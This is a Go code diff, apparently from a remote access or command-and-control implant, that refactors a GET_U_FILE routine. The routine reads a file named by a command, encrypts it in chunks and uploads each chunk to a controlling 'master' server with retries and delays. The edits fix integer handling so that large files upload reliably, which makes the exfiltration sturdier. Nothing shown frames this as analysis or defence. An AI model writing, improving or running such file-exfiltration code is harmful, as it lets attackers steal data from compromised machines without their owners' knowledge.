@@ -694,45 +694,35 @@ func send() { //发送头部信息
         }
     }
     func GET_U_FILE(cmd, splitSize string) {
-        intSize, _ := strconv.Atoi(splitSize)
-        if intSize <= 0 {
-            return
-        }
+        splitSizeInt64, err := strconv.ParseInt(splitSize, 10, 64)
+        if err != nil || splitSizeInt64 <= 0 {return}
+        intSize := int(splitSizeInt64)
+        if intSize <= 0 || int64(intSize) != splitSizeInt64 {return}
         info, err := os.Stat(cmd)
-        if err != nil {
-            return
-        }
-        fileSize := int(info.Size())
-        if fileSize == 0 {
-            return
-        }
+        if err != nil {return}
+        fileSize := info.Size()
+        if fileSize == 0 {return}
         f, err := os.Open(cmd)
-        if err != nil {
-            return
-        }
+        if err != nil {return}
         defer f.Close()
         var maxRetry int
         a_Mutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};a_Mutex.RUnlock()
-        start := 0
+        start := int64(0)
         buf := make([]byte, intSize)
         for start < fileSize {
-            end := start + intSize
-            if end > fileSize {
+            end := start + splitSizeInt64
+            if splitSizeInt64 > fileSize-start {
                 end = fileSize
             }
-            chunkSize := end - start
+            chunkSize := int(end - start)
             n, err := io.ReadFull(f, buf[:chunkSize])
-            if err != nil && err != io.ErrUnexpectedEOF {
-                return
-            }
+            if err != nil && err != io.ErrUnexpectedEOF {return}
             rawChunk := buf[:n]
             encryptedChunk := Encrypt(rawChunk)
-            if encryptedChunk == nil {
-                return
-            }
+            if encryptedChunk == nil {return}
             retryCount := 0
             for retryCount < maxRetry {
-                str_encry := clientname + "*//*" + splitSize + "*//*" + strconv.Itoa(fileSize) + "*//*" + strconv.Itoa(start) + "*//*" + strconv.Itoa(end)
+                str_encry := clientname + "*//*" + splitSize + "*//*" + strconv.FormatInt(fileSize, 10) + "*//*" + strconv.FormatInt(start, 10) + "*//*" + strconv.FormatInt(end, 10)
                 data_encry := get_encry_s(&str_encry)
                 var buffer bytes.Buffer
                 writer := multipart.NewWriter(&buffer)
@@ -744,7 +734,7 @@ func send() { //发送头部信息
                 url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
                 req, _ := http.NewRequest("POST", url, &buffer)
                 req.Header.Set("Content-Type", writer.FormDataContentType())
-                req.Header.Set("Range", "bytes "+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
+                req.Header.Set("Range", "bytes "+strconv.FormatInt(start, 10)+"-"+strconv.FormatInt(end-1, 10))
                 resp, err := client.Do(req)
                 if err == nil && resp.StatusCode == http.StatusOK {
                     resp.Body.Close()
@@ -756,9 +746,7 @@ func send() { //发送头部信息
                 retryCount++
                 time.Sleep(2 * time.Second)
             }
-            if retryCount >= maxRetry {
-                return
-            }
+            if retryCount >= maxRetry {return}
             start = end
             sleepdelay()
         }
